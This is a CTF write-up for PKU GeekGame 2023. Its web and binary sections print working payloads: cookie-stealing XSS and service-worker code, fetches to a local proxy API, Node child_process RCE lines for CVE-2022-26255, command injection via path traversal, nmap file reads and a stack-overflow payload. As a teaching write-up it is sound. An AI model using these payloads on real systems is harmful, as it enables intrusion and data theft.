---
author: "Lost-MSth"
modify_date: "2023-10-20 18:10:00"
---

# PKU GeekGame 3rd 2023 Writeup

> For 工作人员：本 Writeup 会过几天在我自己的 blog 公开，相关代码后续上传到 Github 仓库，东西太多了还没怎么整理，特别是一堆作业要补，就不提交代码了，要查我再给
>
> 所以本 Markdown 格式其实是 Jekyll 的 Kramdown，Mathjax 模块是我自己魔改的，请忽略预览的奇怪的地方，后续公开请直接添加我的 Blog 链接
>
> 祝好！

[相关代码](看什么看)

## Tutorial

### 一眼盯帧

看名字直接知道是逐帧分析，用 StegSolve 一帧一帧看过去可得字符串 `syht{trrxtnzrgurguveq}`，其实我看错了一位（

明显 ROT-13，直接扔进在线网站得结果 `flug{geekgamethethird}`，一眼看出 `u` 变 `a`，提交，**一血！**

### 小北问答!!!!!

1. 明显 SLURM 系统，本人用过超算，搜索自己记忆得到 `sbatch`
2. ~~Google 到 [wikipedia](https://zh.wikipedia.org/zh-hans/MIUI)，搜索得到 OS 版本 MIUI 14.0.3~~，草了，啥用也没有，去小米社区搜得[网页](https://web.vip.miui.com/page/info/mio/mio/detail?isTop=0&postId=41086798&fromBoardId=&fromPage=mioPcSearch&fromPathname=mioPcSearch&app_version=dev.230112)，看图得到 `5.15.78`
3. Google "Apple Identifier list" 转到 [gist](https://gist.github.com/adamawolf/3048717)，搜索得到 `Watch6,16`，
4. 直接主页底下源代码，找到 Github 后端仓库，然后点点点找到 [..._store.py](https://github.com/PKU-GeekGame/gs-backend/blob/master/src/store/user_profile_store.py)，看看发现三个月前有修改记录，故直接阅读即可，找到 `DISALLOWED_CHARS`，前后文复制出来，开头的定义复制一下，CMD `pip install unicategories`，放到 python 里跑一下~~得到长度 `4401`~~，不是，根据提示，~~按照 3.11 版本结果是 `4587`~~，草草草，还不是，按照 3.8 版本结果是 `4445`
5. ~~搜到视频[投稿最多子分区](https://www.bilibili.com/video/av24633291)和[最冷门子分区](https://www.bilibili.com/video/BV1YE411h7kn)，稍微看看就知道 `单机游戏,电子竞技,网络游戏,音游,Mugen`，不过网络游戏分区刚好是 2011.1 上线的，所以多试一下，不对，最冷门不包含投稿小于 100 的子分区，换个思路，看看 b 站的 API，比如这个 `https://api.bilibili.com/x/web-interface/newlist_rank?main_ver=v3&search_type=video&view_type=hot_rank&copy_right=-1&new_web_tag=1&order=click&cate_id=173&page=1&pagesize=30&time_from=20101225&time_to=20110201`，到网上找个[子分区 ID](https://github.com/SocialSisterYi/bilibili-API-collect/blob/master/docs/video/video_zone.md)，手动跑一遍发现是 `单机游戏,电子竞技,手机游戏,网络游戏,桌游棋牌,GMV,音游,Mugen`，好家伙原来都有~~
   草，思路歪了，直接 [wikipedia 历史页面](https://zh.wikipedia.org/w/index.php?title=Bilibili&oldid=33743565)（一直翻到 2014 年的才找到），~~得到 `游戏视频,游戏攻略·解说,电子竞技,Mugen`~~，还不对，我吐了，哦哦，还有个 FLASH 游戏区，直接搜索发现[专栏](https://www.bilibili.com/read/cv2443320/)，里面的图片加文字分析告诉我们应该是 `游戏视频,游戏攻略·解说,flash游戏,Mugen`，或者根据[此文档](https://github.com/Vespa314/bilibili-api/blob/master/api.md)，~~可能是 `flash游戏,单机联机,游戏攻略·解说,Mugen`~~，试了一万年，盲猜 flash 的顺序不对，大概一下午得到答案 `游戏视频,游戏攻略·解说,Mugen,flash游戏`（麻了能不能不要依赖位置）
6. Google `tusholdings konza kacst sponsor` 发现图片上 IASP 2023，查一查发现[这个日记](http://www.iaspbo.com.cn/contents/2/532)，提到了卢森堡爱乐乐团，故大建筑是爱乐音乐厅，官方网站 `philharmonie.lu`

## Misc

### Z 公司的服务器

一眼 `sz` 和 `rz` 命令，ZMODEM 协议分析

#### 服务器

试了几个小时，所有 ssh / telnet 客户端都无法接收文件，感觉差了什么一样，怪的很，好久好久之后，突然开窍了，我直接强行发二进制得了，写个脚本，发送 hex 数据：

```hex
2a2a184230313030303030303633663639340a
2a2a184230313030303030303633663639340a0a
2a2a184230393030303030303030613837630a0a
```

等几秒就吐出 flag 了，是 `flag{anc1Ent_tr4nsf3r_Pr0tOcoi_15_57111_In_u5e_t0d4y}`

等会，你问我上面那串乱东东哪里来的？笑死，是第二问的流量包里抽出来的（

#### 流量包

之前试了好久没拼出来，觉得自己不太聪明，暂时放弃了，然后回过头来看做出了第一题，那……第二题也很简单嘛（笑死，恶心的一比吊糟

很明显数据包里传了个 `flag.jpg` 文件，那就是人工协议分析，找个文件头 `ff d8 ff e0` 和文件尾 `ff d9`，~~企图直接拼接，失败，~~ 前面有明文的文件长度 `16906` ~~，对比一下觉得多了几段，开始试一试去掉几段行不行，事实证明这是想得美~~

回来看的时候，觉得还是要 ZMODEM 协议分析，幸好有[知乎中文专栏](https://zhuanlan.zhihu.com/p/579720546)以及专栏里跳转的 [wiki](http://wiki.synchro.net/ref:zmodem)，这题需要不紧不慢仔细地看一看两个资料，然后会发现不怎么重要的协议头、**数据里分为几个子数据段**、**子数据段原数据不超过 1024 bytes**、**遇上 `0x18` 需要将后面一个字符转义**……之类的恶心玩意，注意子数据段的标识在尾部，全靠长度来表征，结构是 `0x18 0x69 <CRC 16 / CRC 32>`，长度不定因为 CRC 也可能转义，转义就是异或一下 `0x40`

写一个脚本跑一跑（跑不出来不要紧，基本知道有转义就能复原大半，可以打开图片，虽然看不清字符细节），最后考虑到方方面就能还原图片，得到 `flag{traFf1c_aNa1y51s_4_ZMODEM}`

### 猫咪状态监视器

唔，二阶段，有了提示就简单不少了，其实一开始我好像搜到了资料，提到了什么 `/usr/sbin/service ../../bin/sh` 可以提权，呃，但是我觉得后面加上 `status` 就是防止我干这事，然后我思路歪到 python 的那个解析库上去了（笑

源码看一下发现是调了个什么系统命令，那直接多来点参数把 status 挤到后面就好，先来个 `../../bin/ls ./ flag 123465 asdfasdf` 看看有啥，得到文件名，直接 `../../bin/cat flag.txt 123465 asdfasdf` 得到最终结果 `flag{Re4d_u5r_sB1N_SErv1ce_is_hELpfUl}`

### 基本功

#### 简单的 Flag

压缩包里有 `chromedriver_linux64.zip`，已知明文攻击，下了半天对比大小发现版本是 `89.0.4389.23`，然后还要逐个测试压缩等级，测出来是无压缩可以跑，用 ARCHPR 直接出文件（记得停止解密码不然一直跑）

#### 冷酷的 Flag

~~看一眼发现文件压缩比极大，怀疑是 CRC 碰撞~~

扯淡，KB 级别碰撞个毛线，文件格式是 pcapng 流量包，看样子是部分明文攻击，直接搜出 [writeup](https://www.freebuf.com/articles/network/255145.html)

```hex
00 00 4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF
```

照抄完事，~~继续 ARCHPR，大约要搜索 40 分钟草！~~

不会用，还是照抄用 bkcrack 吧，算出来 key `6e02cd73 3a0b3af3 17762ca2`，解包用 Wireshark 打开扫一眼得 `flag{inSecUre-zIp-crYPtO-eVeN-withOuT-KNOWN-fiLe-CONteNt}`

### Dark Room

#### Flag 1

纯运气题，每次成功率 $0.1 \%$，谁出的！！！！

看看游戏源码，写个自动化脚本，人脑最优化即可，最高可到达 90 sanity，通关看到提示要求 117，显然是最后来三次 help，每次有 $10 \%$ 概率成功 +10，所以三次成功即可

跑了大概一小时得到结果，`flag{y0u_PLAy_GAME_vERy_WEl1}`

#### Flag 2

绝了，这和这游戏有啥关系啊

随便走走发现地图和源码不一致，有隐藏房间，是个猜数字题，输个字符报错如下：

```python
Traceback (most recent call last):
    File "dark_room/player.py", line 249, in <module>
    248:   while flag_number:
    249:      choice = int(self.recv(b"Guess my public key (give me a number): ").decode())
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    250:      if flag_number & 1:
    251:          p = getStrongPrime(2048)
    252:          q = getStrongPrime(2048)
    253:      flag_number >> 1
ValueError: invalid literal for int() with base 10: 'save'
```

呃，时间侧信道攻击？道理挺简单的，开搞！测出来大概正好 $1\ \mathrm{s}$ 的时间是对应数字 1，否则是数字 0，对时间差四舍五入即可，注意是最低位开始输出的，以及 pwntools 的 send 功能貌似有点怪，开头和结尾可能差一个 0 或者 1，试一下就好了，最后得到答案，我还以为要填进去，直到一看那个报错，flag_number，emmmmm，该不会是二进制数据吧，转 bytes 搞定，得到 `flag{You_s0lved_tH1s_chALLeNge_EXcEllENtLy}`

### 麦恩·库拉夫特

Minecraft 草，先开创造模式

地图编辑器 Amulet 发现坐标 `558 98 -125` 有个巨大红石电路，比较人工输入和磁带输入，找到个点来 F3 数据分析，然后录视频手动翻译，过了一会信号消失了，说明磁带一次性跑完了就结束了，呃……手动翻译出来：

```hex
5 d6a3f8d38131b75bf5692864764aca00b6f4c764416a5cfbeeef88dbfae3700468baefd00e7357c171b93758bef9f6b5218cd87fae158d4d76186abf56256dde7f7f0049b44950a8b91a2c0

49454e44ae42608200
```

好嘛，居然是 PNG 格式的文件尾部，寄了（

#### 探索的时光

Amulet 是在太卡了，我就想看个区块它把 3D 模型全加载出来干嘛，换个 MCA Selector 看看，我去，轻轻松松

明显区块分为两块，先做一个竖直方向扫描，根据提示发现 -9 高度处有一个正方形的钻石物质，盲猜是那里，`/tp 192 -9 152` 后发现木牌子，有 `flag{Exp0rIng_M1necRaft_i5_Fun}`

#### 结束了？

其实很简单，因为我知道 flag3 是那个红石磁带，所以 flag2 肯定在另一个连通区块中，而稍微看看就发现，**地图的区块正好大约是三个正方形叠加**，所以东西肯定在中心，直接放大开始细致高度扫描，同样发现一个小小的正方形钻石图案，故 `/tp 3280 -32 -1895`，木牌上写着 `flag{pAR3inG_ANvI1_iSeAaasY2}`

#### ~~为什么会变成这样呢？~~

`/tp 558 98 -125` 再看看结构，觉得应该可以命令方块输出到控制台然后导出日志即可，使用**循环命令方块**，使用 `say` 命令输出，用的 HMCL 启动器，已经自带日志了

我快疯了！！！！！！！！！

1. 用视频加自己写的数字识别
2. 循环命令方块输出
3. 命令方块输出
4. F3 + I 剪切板输出

以上各做了两三遍，耗时一天多，tmd 那个傻缺子 PNG 就是 crc32 过不了，绝了！

修正：又又又弄了半天，长度对了，只有 IDAT 块的 crc32 过不了了，疑似几个数字双写或者三写偏了，这还是整个 IDAT 块，是 deflate 压缩的，歪一两个就看不出来原图了，貌似我的最好结果是能看到 fl 两个字符的上半部分的一点点，但实在不想弄了，吐了

提示屁用没有！

## Web

### Emoji Wordle

会话……说的是 session？随手看一眼 cookie，好熟悉啊，是 flask session，三段的，最后一段是校验，都是 base64 编码，不过可能省略末尾的等号，以及第三段会替换斜杠

#### Level 1

base64 解码，第一段是 `{"alg":"HS256"}`，好家伙 HS256，也就是可以重放攻击，看一下第二段里面有剩余猜测次数和游戏难度，呃，那就是说我只要固定 cookie，可以随便暴力破解了，无视次数限制的

我怎么感觉这不是 level 1 的正解呢（）

不管了，表情范围是 `chr(0x1f300)` 到 `chr(0x1f7ff)`，测试一下爆破间隔 1s 左右是合适的（不过还是会有可能连接中断，建议留存数据），一会儿就能爆破完毕.jpg

最终有 `flag{s1Mp1e_brut3f0rc3}`

#### Level 2

看一眼 cookie 发现巨长无比，怕不是答案写里面了，直接解码得到 unicode 字符串，随便找个在线 unicode 转码网站转码后提交得到 `flag{d3c0d1n9_jwT_15_345y}`

#### Level 3

还是 HS256，限时一分钟，怀疑是脚本抢速度，改改脚本，第一次时获取 cookie 并在以后的 GET 中固定，然后开始刷就完事了，取消时间间隔，记得超时重放，还有就是需要利用前面两题缩小一下 emoji 的范围，然后看天（指网络问题），最后得到 `flag{StateIess_game_IS_a_b4d_1d3a}`

### 第三新 XSS

#### 巡猎

二阶段，不是啊，我早早早早就找到这个[文档](https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security)，写个了 iframe 的，~~但是屁用没有啊~~

我错了！傻逼的我居然没有手动从 F12 console 中调一调，犯了个写过油猴脚本之类的东西就不应该再犯的错！（骂自己）iframe 在脚本运行时还没加载完毕啊啊啊啊！！！！！

```html
<iframe src="/admin" id="iframe"></iframe>
<script>
var iframe = document.getElementById('iframe');

iframe.addEventListener('load', function() {
  var iframeDoc = iframe.contentDocument;
  document.title = iframeDoc.cookie;
});
</script>
```

加上延时直接过了，`flag{TotALlY-NO-SeCuRIty-In-The-sAme-ORIgiN}`，我特么狂丢 $155 \times 65 \% \approx 101 $ 分

#### 记忆

二阶段，提示给的相当明白和充足，立马就能搜索到持久化 XSS，注意到 Service Worker 需要单文件 js，因为我们可以改 Header，那就交个新页面  `hack_js` 当做 js，注意请求头设置为 ```{"Content-Type": "application/javascript", "Service-Worker-Allowed": "/"}```，多了的一项是因为 Service Worker 要允许跨路径的话，就要这么干

```js
this.addEventListener('fetch', function (event) {
    // var url = event.request.clone();
    // console.log('url: ', url);
    event.respondWith(
        new Response('<script>setInterval(function() { document.title = document.cookie; }, 200);</script>',
            {headers: {'Content-Type':'text/html'}}
        )
    )
});
```

这次再也不会犯错了，直接 `setInterval` 反复设置标题，接下来写我们的注册代码，放到另一个页面上，请求头别改：

```html
<script>
navigator.serviceWorker.register('/hack_js/', { scope: '/' })
    .then(function (reg) {
      console.log('success', reg);
    })
    .catch(function (err) {
      console.log('fail', err);
    });
</script>
```

scope 这个坑点提示说了，不说也很明白，起码我的浏览器直接在 console 的问题中提示了，最后提交 register 代码的主页，得到 `flag{perSiSTENT-xSS-aTTACk-UsiNG-SErvIce-WORkER}`

有点可惜，这题其实能搜到大概的，要不是我傻了卡在第一问上（

### 简单的打字稿

#### Super Easy

二阶段，说真的提示也就坚定我方向没错……搜一搜如何切分 type 中的字符串得到[回答](https://stackoverflow.com/questions/70831365/can-i-slice-literal-type-in-typescript)，可以在某些 [typescript playground](https://www.typescriptlang.org/play) 进行测试，利用一下就得到：

```ts
type Split<S extends string, D extends string> =
    string extends S ? string[] :
    S extends '' ? [] :
    S extends `${infer T}${D}${infer U}` ? [T, ...Split<U, D>] : [S];

type my_type = Split<flag1, 'g'>
const test: my_type = 1;
```

有点可惜，如果能多搜一搜说不定就能做出来了，最后注意分割的字符，把报错里的东西拼起来得到 `flag{TOo0_e4sY_F1aG_foR_Tooo_EAsy_lANg}`

#### Very Easy

二阶段，这题怎么分值比上题低呢，根本不合理好吧！

难点挺多，要一步一步解构那团乱七八糟玩意，大部分能搜到但比较难搜，感觉全靠 typescript playground 的实时类型定义查看，最难的一点我搜了几乎两小时才得到[这个回答](https://stackoverflow.com/questions/52984808/is-there-a-way-to-get-all-required-properties-of-a-typescript-object)，就是如何提取 object 的必须 key

```ts
type Split<S extends string, D extends string> =
    string extends S ? string[] :
    S extends '' ? [] :
    S extends `${infer T}${D}${infer U}` ? [T, ...Split<U, D>] : [S];

type HasNew<T> = T extends {new (): {}} ? T : never;
type GetReturn<T> = T extends new () => infer R ? R : never;
type GetAnd<T> = { [P in keyof T]: T[P] ; }
type RequiredLiteralKeys<T> = keyof { [K in keyof T as string extends K ? never : number extends K ? never :
    {} extends Pick<T, K> ? never : K]: 0 }

type x = HasNew<flag2>;
type y = GetReturn<x>;
type value = y['v'];
type z = ReturnType<value>;
type a = Parameters<z>[0];
type b = Parameters<a>[1];
type c = GetAnd<b>;
type d = RequiredLiteralKeys<c>;
type e = Split<d, 'f'>;

const test: e = 1;
```

其实还有个坑，跟运气有关，就是最后分割符选不好出不来，因为结果是 `flag{Ts_fLaG_beTTeR_THan_PYTH0n!}`，flag 里面还有个 fLaG 草！

### 逝界计划

太太太可惜了！！！！！！！！！我二阶段前找到 nmap 了！！！！觉得可疑！！！！但是又不知道怎么判断脚本是否执行！！！！我以为加载集成是不会执行的草草草草草草草！！！！我要是回头看一眼日志（早就看到日志了）就好了！！！！！

注意所有操作都在配置菜单里

二阶段，已知是 nmap 集成，可以输入参数，看看手册，加载文件肯定是 `-iL`，那第一个问题就是如何找到文件，在 docker 配置里告诉我们了是 `/flag`（我瞎了，一开始没看到是绝对路径）

第二个问题是输出，home assistant 有详细日志，加日志等级可以输出个卵蛋，呃，还是有点用的，可以看出文件是否存在……

那就要找别的输出手段，google 一下 nmap 文件读取可得[资料](https://blog.i1nfo.com/posts/ctf-nmap-webshell/index.html#payload-39-lt-eval-GET-cmd-gt-oN-a-phtml-39)，看看其它题怎么输出的？哦，是 `-oN` 选项写到别的文件里

那我怎么下载呢？一开始想覆盖日志，可是不安装一下 docker 我都不知道文件在哪啊喂，所以……我稍稍翻了一下发现有个东西叫做备份，手贱点一点，给了个绝对路径文件的下载……笑死我了

nmap 选项改一改，去下备份文件，打开见到 `Failed to resolve "flag{sOOOo-mAny-LOoPhOLeS-in-hOmE-AsSisTAnt}".`

### 非法所得

二阶段艰难地做出来了，我实在是想吐槽，一个误操作这题环境就要重开草（

本题我基本全部是依赖上面那题[第三新 XSS](#第三新-xss) 提供的环境来写脚本的，这要真的是正解的话，建议下次别出了.jpg

#### Flag 1

提示给的文档……我之前找到过啊草！因为我看到 secret 是空的有所警觉，但觉得反正 visit 只能访问 pku 域名，好像也不能 import 吧.jpg

~~我实在想不到办法了~~，我想到了一个骚操作，实践并且成功了，不知道这是不是预期解啊，感觉不是（

有一个我可以自由操作的 pku 域名网页，是谁呢，锵锵！就是我[第三新 XSS](#第三新-xss)啦！！！

等会，写这段话的时候，我觉得这是预期解了，因为这题涉及原神，而第三新 XSS 那题涉及崩铁……这也是一种提示吗（

这题需要两个网页，然后让靶机访问，第一个是修改：

```html
<p id="p1">Hello World!</p>
<script>        
   const data = {
       path: "/app/profiles/flag.yml"
   };

   fetch('http://127.0.0.1:9090/configs', {
       method: 'PUT',
       headers: {
           'Content-type': 'application/json; charset=utf-8',
       },
       body: JSON.stringify(data),
   }).then(response => response.json())
       .then(data => {
           document.getElementById("p1").innerHTML = JSON.stringify(data);
       })
       .catch((error) => {
           document.getElementById("p1").innerHTML = JSON.stringify(error);
       });
</script>
```

第二个是获取，因为修改后你也不能在 Control 的截图里看到，把上面那个改成一个对 `http://127.0.0.1:9090/proxies` 的 GET 请求 visit 即可，然后人眼 OCR 得到答案 `flag{C1Ashc0r3ISUnS3cure}`

#### Flag 2

要求访问 `ys.pku.edu.cn`，呃，我只有一点点思路，不多，提示说是要自己找隐藏的网站，我有一个大胆的想法，使用公网 IP 架设伪造页面，然后用上一题的方法设置 clash DNS hosts 将域名解析上去，~~可是啊，我哪有公网 IP 啊（~~

~~我觉得正解是要找一个隐藏的 IP 地址……很奇怪的是，`ys.pku.edu.cn` 是有 DNS 解析的，是一个 IP `162.105.130.58`，唔同 IP 查询得到另一个域名 `proxy.pku.edu.cn`，好了，都不能访问，不会了（~~

当我没说，还是来点骚操作，弄一个云服务器，这下有公网 IP 了.jpg（能报销吗

直接在题目给的 `flag.yml` 下面加点料：

```yml
hosts:
  a.pku.edu.cn: '127.0.0.1'
  ys.pku.edu.cn: '**.**.**.**' # 隐私打码，请填入真实公网 IP
```

然后利用第一问的方法部署到公网上，直接 import（好像用个 Github 仓库可行），呃，这两个 host 都超有用，第一个用来判断我干对了，以及可以玩一玩 localhost 的各种端口里的各种奇奇怪怪接口，第二个用来解题

在云服务器上直接开个静态文件服务器，最方便肯定是 Flask，而我更偷懒了，~~以前~~写过私服，直接把主页替换一下，替换成以下的 HTML 文件：

```html
<!DOCTYPE html>
<html lang="en">
<head><title>Genshin</title></head>
<body>
<input id="primogem_code" type="password" size="80">
<script>
    setTimeout(function () {
        document.getElementById("primogem_code").type = "text";
    }, 3500);
</script>
</body>
</html>
```

一个容易注意到的坑点是密码转明文，显然是 5s 后截图传回，所以设置个不上不下的时间把 input 控件属性改掉就行，第二个坑挺搞，就是长度，太短看不全的（对，第一次弄被坑了，然后恰巧环境崩掉了，靶机的浏览器打不开了疯狂报错，而回头一看 XSS 那题的环境又被关了，好嘛，全部重来

重来一次，得到截图，人眼 OCR 可得 `flag{BaDpR0xyCaus3sbad0utcom3}`

#### Flag 3

兄啊，这么大的 [clash RCE 漏洞](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710) `CVE-2022-26255` 谁不知道啊，这不等于没提示吗（

用第一问的方法可以轻松 RCE ……个锤子，我看不到回显啊啊啊啊，成功与否未知，用 API 读取 stream log 的方式好像看不到输出，倒是确实可以看到一点日志（对对，延时 5s 也一点让我想到这步的，结果是第二问用了），看不到输出我就想写到文件然后读取，有可远程读取目录 `/usr/share/novnc`，可是好像成功不了诶，~~放弃了（~~

没放弃，做梦都在想怎么输出，好吧，我还是用一下第一问那个修改 config 的脚本，实际上当时试的时候就发现会格式不对会报错，**然后吐出文件前几个字符**

那就顺理成章……个鬼，这题有大坑，我试了几乎一整天才得知一个重要的限制，不知道为什么，**这里 `eval` 函数里面是不能有空格的**，不然无法执行，我试过转义，但并没有成功（

不能有空格，导致几乎没办法传命令行参数，我一开始想到的是 `ls>out` 这样的方式，当然要转义一下变成 `ls&gt;out`，这是可行的，不过难点还是如何切分输出，那我怎么想都只有 `split` 命令来切文件，故得换个思路

注意一个小坑，我之前说过想写到 `/usr/share/novnc` 目录里利用静态资源代理获取输出，但不行，因为**权限不足**，`whoami` 的结果是 `node`，所以所有文件写入需都在 `/tmp/*` 中进行

仔细看看 node 的文档，并 Google 一下 node 的 `exec` 写入文件即可得到一种奇怪的 stream 写法以及 `spawn` 函数，那就有点眉目了：

```js
require("child_process").exec("/app/readflag").stdout.pipe(require('fs').createWriteStream("/tmp/flag"));
require("child_process").spawn('split',['-b5','-d','/tmp/flag','/tmp/out']).stdout.pipe(require('fs').createWriteStream("/tmp/flag2"));
require("child_process").spawn('cat',['/tmp/out00',]).stdout.pipe(require('fs').createWriteStream("/tmp/flag2"));
require("child_process").spawn('cat',['/tmp/out01',]).stdout.pipe(require('fs').createWriteStream("/tmp/flag2"));
......
```

依次将上面每行复制粘贴三次到 Github Issue 里给的那个范例 PoC 上，扔给 XSS 那题的网页生成主页，从本题 Import，然后 Visit 第一问的网页导入配置 `/tmp/flag2` 来报错输出

注意千万千万不要有空格，我就是习惯问题在参数数组中的逗号后来了几个空格，半天才看出来，还有一个坑是切分文件的开头不能是 `{}` 这两个特殊字符，不然会有别的报错没有内容了，所以这里采用了 5 字符切分，最后把看到的每个文件内容拼起来即可，人眼 OCR 有 `flag{Uns3cureP0WEredByE1ecTroN}`

## Binary

### 汉化绿色版免费下载

#### 普通下载

解压发现是 ADV 游戏，有 xp3，直接 GARbro 无密码提取，然后 EmEditor 搜索 "flag" 字符发现程序逻辑和 flag1

#### 高速下载

上面那题顺带发现 flag2 是出题人输入的内容，发现游戏是 Kirikiri 引擎，用 KirikiriDescrambler 解存档，打开看看，发现一个奇怪的 hash，重新看游戏逻辑，输入时根据输入值有 $13337\  \text{hash} +11n$，然后 $\mathrm{mod} \ 19260817$，~~这数字很眼熟啊~~

然后硬弄了好久都没有思路（

回头看看题，觉得还有信息，看看存档，发现神秘代码 `KAGeXpress_voice`，全局搜索发现是 `KAGeXpress ver 3.0 封装宏集`，用来记录声音

重新看存档发现还有两个文件，解了 `datasu.ksd` 后看到了 round_1 的输入字符是 AEIO，次数为 6 3 1 6（吐槽：我自己试了好半天才发现这后面的数字是点击次数），写个 cpp 脚本 BFS 一下就好，结果是 `flag{OOAAAAEAEIEAOOOO}`，~~好像还是有点眼熟，这不 brainpower 吗~~

### 初学 C 语言

#### Flag 1

试了试又看了看，发现 `printf` 第一个参数居然是输入值，有大问题，直接疯狂一连串 `%p` 即可打印栈信息，找一找发现奇怪数字 `0x3465727b67616c66 0x66544e3152505f64 0x6f535f656430435f 0xa7d797a34655f`，手动或者脚本翻译得到 `flag{re4d_PR1NTf_C0de_So_e4zy}`

#### ~~Flag 2~~

猜测是任意内存写，覆盖 `printf` 的地址来替换命令，IDA 看了一眼，一堆跳转，找不到 `system`，不会了（

### Baby Stack

二阶段做的，别问，问就是菜（

#### Flag 1

这提示算有大用，因为之前看的时候只发现了栈溢出，那个整数溢出没看见，另外就是一个大坑，`movaps` 指令要求对齐我真不知道啊

一开始试了半天，觉得自己是偏移算错了，当然确实算错了，没看见是按 byte 读的，以为 8 bytes 一读直接算错，还想为啥用不到整数溢出……

IDA pro 到栈空间看一看，数组指针偏移是 `-0x78`，就是 120，找一下后门地址 `0x4011B6`，然后写出攻击脚本死都跑不出来，好吧，仔细看提示然后搜一下发现要找个 return 地址来对齐，方便就直接找 `get_line` 的返回地址 `0x401229`，最终有 payload `payload = b"B" * (120) + p64(0x401229) + p64(0x4011b6) + b'\n'`，然后就可以愉快 `ls` 和 `cat flag` 了，得到 `flag{_A_N1C3_Beg1nn1ng_g00d_j0b_huRRay}`

#### ~~Flag 2~~

不会

### 绝妙的多项式

#### Baby

```python
N = 0x3b800001

init = [0] * 36 # flag{...}

D = [0x00000CF6, 0x16C80709, 0x086B7BDA, 0x05FBEE9E, 0x24D1FFC1, 0x16F76AE2, 0x15F03305, 0x218C23F9, 
0x33163AC1, 0x0332C16E, 0x27E7B4A7, 0x241D8073, 0x01C6F122, 0x2D73DE13, 0x07FC0A09, 0x0D50F7B7, 
0x0261B1DD, 0x37E5BB8E, 0x0DA71DC5, 0x2DC3F20C, 0x00CCB13A, 0x2F6341E4, 0x0B0611DB, 0x0A382A1A, 
0x103C09B2, 0x1CE2BE88, 0x19A9FD15, 0x2621CFC1, 0x2970DEAC, 0x08A463AA, 0x116C6D31, 0x222E9178, 
0x33B9C9DD, 0x2F98D035, 0x00B8177A, 0x342611E8]

for i in range(1, 37):
    ans = 0
    y = 1
    for j in range(36):
        x = (init[j] * y) % N
        ans += x
        y *= i
    assert ans == D[i - 1]
```

看几眼，发现是同余方程组 $$A X \equiv D \  (\text{mod } n)$$，其中矩阵 $A$ 就是多项式生成的玩意，第一行全是 1，第二行是 $1, 2, 4, 8, \cdots$，依此类推（就是 1 到 36 进制啦，虽然没有 1 进制

这真的不是数学题吗，请放到 Algorithm 里啊喂！

上网找个[求解器](https://github.com/55-AA/mod_equations)，python 2 版本的，还得调一调，而且输入是增广矩阵，挺怪的哦，最后解出来一个数组，bytes 得到 `flag{yoU_Are_THE_mA$T3r_of_l@gR4nGe}`

#### ~~Easy~~

看不懂，交给 GPT，告诉我是 FFT 蝶形算法，仔细搜索后发现是 NTT，但是试了半天都不对，只能解出第一个字母 'f'，仔细看看发现 W 矩阵的算法貌似魔改了，但是不会做，头疼（

## Algorithm

### 关键词过滤喵，谢谢喵

#### 字数统计喵

没看源码根本看不出来什么，看了就知道是实现了一个正则编码的虚拟机，~~那就简单了~~，草，弄死我了，注意点特别多

1. 特殊处理空文件
2. 利用重复替换把长度 $10^n$ 的非 emoji 字符转为特定的 emoji
3. emoji 转 10 进制数字
4. 注意可能出现占位的 0，利用反向匹配和正向匹配来锚定插入数字 0 的位置（简单说我的实现就是在 emoji 和数字间插入 0），注意 python 的反向匹配不支持变长草草草草！

测试完提交，得到 `flag{W0W_yOU_C4n_REal1Y_rEGEX}`

下面两问没脑子做了（

### 未来磁盘

#### Flag 1

文件下来，解压！解压到 7 GB 大小时停住，再解压就是原文件了，不过大小有点离谱（找台服务器说不定可以

EmEditor 打开看看（超流畅，强烈推荐此编辑器，虽然 010editor 也很好），哦哦，文件头是 gz 格式的，gzip 不是网络通信常用的嘛，超适合流式解压，边下边看（不是

写个脚本开跑，电脑风扇起飞！呃不对，等会我看看题，flag 文件夹在两个大的全 00 文件之间，哦哦，找一下 offset，看二进制，正好是两种明显不一样的数据的分界点，填上去，瞬间出结果，舒服了，`flag{m0re_GZIP_fi1e_b0mB}`

记得做完题把文件删了（

#### ~~Flag 2~~

C 盘红了草！

大概思路是有的，就是跳到某个位置进行解压缩即可，然后按照上题的做法做，不过没有现成脚本，唯一似乎对的上要求的 [gzip-random-seek](https://github.com/llandsmeer/gzip-random-seek) 因未知原因不可用，懒了（

### 小章鱼的曲奇

#### Smol Cookie

伪随机猜测，是 python 的，搜索找到 [randcrack](https://github.com/tna0y/Python-random-module-cracker)，需 624 个 32 位数，2500 正好够了，搞定

#### Big Cookie

~~不会，猜测思路是不同种子相同随机数，可是试了半天也没成功~~

等会，我发现好像 `secrets.randbits(22)`，这好像很小啊，可以爆破吧

于是，写了半个脚本准备爆破，然后企图拿个数据，服务端给我 `seed1 = 1f8b4e6cfd5b92a20a51a2e9a6713a6a6efb92f146f6bc84e21e324bf77b655b`，我偷懒只动了末尾改了个 `seed2 = 1f8b4e6cfd5b92a20a51a2e9a6713a6a6efb92f146f6bc84e21e324bf77b6550`，然后给了一堆密文，我复制到本地跑一下看看，然后搞笑的来了！！！

run 脚本（是第一题的脚本改了下输入），出明文了！啊？？？我还没爆破呢……

这是不是非预期了（

#### SUPA BIG Cookie

唔，我不好说，纯纯把我当傻子题（

我非常非常怀疑是题目有问题，然而仔细读读源码发现没问题啊，似乎就是对比两个 seed 序列生成的随机数是否一致，那我直接脚本重输一遍不就好了.jpg

更傻的一点是，`zip` 函数会直接取短序列，所以这题只需要把它给我的第一个 seed 复制一下，粘贴，回车，flag 到手，答案是 `flag{pYthON_rand0m_sOo000oO0oOoO0OoOo000_Easy}`

这绝对是非预期吧（

### 华维码

#### 华维码·特难

数字华容道，又称 15 puzzle，一开始思路是拼图然后交给自动求解器，我错了，笑死，根本拼不出来的（

先找个拼图软件 [Puzzle-Merak](https://github.com/JamesHoi/PuzzleSolver)，然后打开网站 [qrazybox](https://merri.cx/qrazybox/) 准备爆杀，呃，我被爆杀了（

但还是做出来了，先看看三个大黑块和回字形定位点，发现空的那块是最左上角，确定后看看连接大黑块的两条黑白间隔线，这大概能确定好几个，下面打开网页，开始试玩，拼的差不多了，交给 qrazybox 分析一下，我去运气爆炸，最右下角猜对了导致数据开头的 `flag{` 出现了，以及总长度也出现了，按照数据排列规则可以大致看出哪几块是不对的

